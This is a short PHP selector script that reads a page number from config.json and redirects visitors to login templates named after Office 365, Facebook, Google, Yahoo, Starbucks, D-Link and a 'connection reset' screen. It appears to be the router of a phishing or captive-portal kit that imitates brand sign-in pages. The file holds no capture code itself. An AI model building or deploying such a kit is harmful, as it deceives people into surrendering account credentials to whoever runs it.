<?php 
$json = json_decode(file_get_contents("config.json"), true);
switch ($json['page']) {
    case "1":
		header("Location: pages/office365"); 
		break;
    case "2":
		header("Location: pages/connection_reset"); 
		break;
    case "3":
		header("Location: pages/minimal"); 
		break;
    case "4":
		header("Location: pages/dlink"); 
		break;
    case "5":
		header("Location: pages/oauth-login");
		break;
	case "6":
		header("Location: pages/facebook-login");
		break;
	case "7":
		header("Location: pages/google-login");
		break;
	case "8":
		header("Location: pages/starbucks-login");
		break;
	case "9":
		header("Location: pages/yahoo-login");
		break;
    default:
		header("Location: install/");
}

